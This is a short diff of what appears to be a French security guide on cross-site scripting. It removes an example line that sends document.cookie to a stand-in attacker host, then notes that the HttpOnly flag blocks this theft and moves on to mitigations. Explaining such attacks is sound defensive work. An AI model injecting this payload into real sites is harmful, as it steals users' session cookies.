@@ -199,9 +199,7 @@
 
 - **Exfiltration simple de cookie**
   - Exemple JS injecté :  
- ```js
-new Image().src = 'https://attacker.example.com/?c=' + encodeURIComponent(document.cookie);
-    ```
+
   - Condition : si le cookie **n’est pas** protégé par le flag `HttpOnly`, le script peut le lire et l’envoyer à un serveur contrôlé.
 
 - **Mitigations**
